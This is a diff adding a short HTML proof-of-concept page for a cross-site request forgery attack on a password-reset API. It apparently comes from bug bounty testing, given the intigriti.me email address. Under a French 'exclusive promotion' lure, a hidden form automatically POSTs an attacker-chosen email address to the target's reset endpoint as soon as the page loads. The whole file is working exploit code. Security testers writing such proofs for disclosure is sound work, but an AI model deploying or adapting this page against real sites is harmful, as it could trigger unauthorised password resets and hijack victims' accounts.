@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - Password Reset</title>
+</head>
+<body>
+    <h1>Promotion exclusive ! 🎯</h1>
+    <p>Redirection en cours...</p>
+    
+    <form id="csrf-form" action="https://www.target.fr/api/v2/users/reset_password" method="POST">
+        <input type="hidden" name="email" value="raz_26+2@intigriti.me" />
+    </form>
+
+    <script>
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        }
+    </script>
+</body>
+</html>
